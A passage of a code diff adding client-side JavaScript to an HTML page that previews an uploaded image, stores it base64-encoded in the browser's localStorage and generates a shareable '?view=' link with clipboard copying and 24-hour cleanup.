+            uploadArea.style.borderColor = '#667eea';
+            uploadArea.style.background = '';
+            
+            if (e.dataTransfer.files.length) {
+                handleFileSelect(e.dataTransfer.files[0]);
+            }
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length) {
+                handleFileSelect(e.target.files[0]);
+            }
+        });
+
+        sendBtn.addEventListener('click', generateTemporaryLink);
+        copyBtn.addEventListener('click', copyLinkToClipboard);
+
+        // Handle file selection
+        function handleFileSelect(file) {
+            // Check file type
+            if (!file.type.match('image.*')) {
+                showMessage('Please select an image file (JPG, PNG, GIF, WebP)', 'error');
+                return;
+            }
+            
+            // Check file size (max 5MB)
+            if (file.size > 5 * 1024 * 1024) {
+                showMessage('File size should be less than 5MB', 'error');
+                return;
+            }
+            
+            selectedFile = file;
+            
+            // Preview image
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                imagePreview.src = e.target.result;
+                previewContainer.style.display = 'block';
+                sendBtn.disabled = false;
+            };
+            reader.readAsDataURL(file);
+        }
+
+        // Generate temporary link
+        async function generateTemporaryLink() {
+            if (!selectedFile) {
+                showMessage('Please select an image first', 'error');
+                return;
+            }
+
+            // Show loading
+            loading.style.display = 'block';
+            sendBtn.disabled = true;
+            hideMessage();
+            linkContainer.style.display = 'none';
+            linkBox.textContent = 'Loading link...';
+
+            try {
+                // Convert image to base64
+                const base64Image = await fileToBase64(selectedFile);
+                
+                // Create temporary link
+                const tempLink = createTemporaryLink(base64Image, selectedFile.type);
+                
+                // Display the link
+                displayTemporaryLink(tempLink);
+                
+                showMessage('✅ Temporary link created successfully!', 'success');
+                
+            } catch (error) {
+                console.error('Error:', error);
+                showMessage(`❌ Error: ${error.message}`, 'error');
+                sendBtn.disabled = false;
+            } finally {
+                loading.style.display = 'none';
             }
         }
+
+        // Convert file to base64
+        function fileToBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => {
+                    // Remove the data:image/...;base64, prefix
+                    const base64 = reader.result.split(',')[1];
+                    resolve(base64);
+                };
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
+
+        // Create temporary link
+        function createTemporaryLink(base64Image, mimeType) {
+            // Generate a unique ID for this image
+            const imageId = generateUniqueId();
+            
+            // Store image data in localStorage
+            const imageData = {
+                id: imageId,
+                image: base64Image,
+                mimeType: mimeType,
+                createdAt: Date.now()
+                // Note: viewStartTime will be set when the link is first opened
+            };
+            
+            // Store in localStorage
+            localStorage.setItem(`temp_image_${imageId}`, JSON.stringify(imageData));
+            
+            // Clean up old expired images (older than 24 hours)
+            cleanupOldImages();
+            
+            // Create the link
+            const currentUrl = window.location.href.split('?')[0];
+            const tempLink = `${currentUrl}?view=${imageId}`;
+            
+            return tempLink;
+        }
+
+        // Generate unique ID
+        function generateUniqueId() {
+            return 'img_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Display temporary link
+        function displayTemporaryLink(link) {
+            currentLink = link;
+            linkBox.textContent = link;
+            linkContainer.style.display = 'block';
+        }
+
+        // Copy link to clipboard
+        async function copyLinkToClipboard() {
+            try {
+                await navigator.clipboard.writeText(currentLink);
+                
+                // Show success message
+                copySuccess.style.display = 'inline';
+                setTimeout(() => {
+                    copySuccess.style.display = 'none';
+                }, 2000);
+            } catch (err) {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = currentLink;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                
+                // Show success message
+                copySuccess.style.display = 'inline';
+                setTimeout(() => {
+                    copySuccess.style.display = 'none';
+                }, 2000);
+            }
+        }
+
+        // Clean up old images from localStorage (older than 24 hours)
+        function cleanupOldImages() {
+            const twentyFourHoursAgo = Date.now() - (24 * 60 * 60 * 1000);
+            
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                
+                if (key.startsWith('temp_image_')) {
+                    try {
+                        const data = JSON.parse(localStorage.getItem(key));
+                        
+                        // Remove if created more than 24 hours ago
+                        if (data.createdAt && data.createdAt < twentyFourHoursAgo) {
+                            localStorage.removeItem(key);
+                        }
+                    } catch (e) {
+                        // Invalid JSON, remove it
+                        localStorage.removeItem(key);
+                    }
+                }
+            }
+        }
+
+        // Show message
+        function showMessage(text, type) {
+            message.textContent = text;
+            message.className = `message ${type}`;
+            message.style.display = 'block';
+            
+            // Auto hide after 5 seconds
+            setTimeout(() => {
+                message.style.display = 'none';
+            }, 5000);
+        }
+
+        // Hide message
+        function hideMessage() {
+            message.style.display = 'none';
+        }
+
+        // Initialize
+        window.onload = function() {
+            // Check if we're in viewer mode
+            if (checkViewerMode()) {
+                return; // Don't show upload interface if in viewer mode
+            }
+            
+            // Clean up old images on startup
+            cleanupOldImages();
+        };
     </script>
 </body>
 </html>
